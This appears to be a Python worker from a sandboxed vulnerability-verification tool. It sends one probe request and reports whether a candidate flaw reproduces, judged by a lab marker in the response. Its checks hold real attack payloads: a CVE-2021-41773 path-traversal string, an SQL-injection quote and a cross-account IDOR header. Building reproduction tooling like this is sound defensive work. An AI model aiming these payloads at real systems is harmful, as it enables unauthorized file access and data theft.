"""Authorized, non-destructive reproduction probe worker.

Runs inside the `egress_sentinel` sandbox and connects ONLY to the Gateway-pinned
(ip, port). Verifies whether a candidate vulnerability (e.g., cross-account IDOR
with dedicated test accounts, or CVE-2021-41773 path normalization check against
a harmless verification marker) actually reproduces ("proven") or is blocked by
defenses ("not_reproduced").
"""
from __future__ import annotations

import argparse
import http.client
import json
import socket
import ssl


CHECKS = {
    "idor": {
        "path": "/api/accounts/B/secret",
        "headers": {"X-Test-Account": "acct_A"},
        "marker": "VULNIX_LAB_IDOR_PROVEN",
    },
    "cve_2021_41773": {
        "path": "/cgi-bin/.%2e/.%2e/etc/lab-release",
        "headers": {},
        "marker": "VULNIX_LAB_PATH_TRAVERSAL_PROVEN",
    },
    "sqli": {
        "path": "/api/search?q=test%27",
        "headers": {},
        "marker": "VULNIX_LAB_SQLI_PROVEN",
    },
}


def main() -> None:
    p = argparse.ArgumentParser()
    p.add_argument("--scheme", required=True, choices=["http", "https"])
    p.add_argument("--host", required=True)
    p.add_argument("--ip", required=True)
    p.add_argument("--port", type=int, required=True)
    p.add_argument("--check", required=True, choices=sorted(CHECKS))
    a = p.parse_args()

    spec = CHECKS[a.check]
    sock = socket.create_connection((a.ip, a.port), timeout=10)
    if a.scheme == "https":
        sock = ssl.create_default_context().wrap_socket(sock, server_hostname=a.host)
    conn = http.client.HTTPConnection(a.host, a.port, timeout=10)
    conn.sock = sock
    req_headers = {
        "Host": a.host,
        "User-Agent": "vulnix-reproduction-probe/1.0",
        **spec["headers"],
    }
    conn.request("GET", spec["path"], headers=req_headers)
    r = conn.getresponse()
    raw_body = r.read(4096).decode("utf-8", "replace")
    try:
        parsed_body = json.loads(raw_body)
    except ValueError:
        parsed_body = None

    established = (
        r.status == 200
        and (
            spec["marker"] in raw_body
            or (isinstance(parsed_body, dict) and bool(parsed_body.get("established")))
        )
    )
    verdict = "proven" if established else "not_reproduced"
    print(json.dumps({
        "check": a.check,
        "request_path": spec["path"],
        "request_headers": spec["headers"],
        "status": r.status,
        "established": established,
        "verdict": verdict,
        "response": parsed_body if parsed_body is not None else raw_body,
        "connected_ip": a.ip,
        "connected_port": a.port,
    }, ensure_ascii=False))


if __name__ == "__main__":
    main()
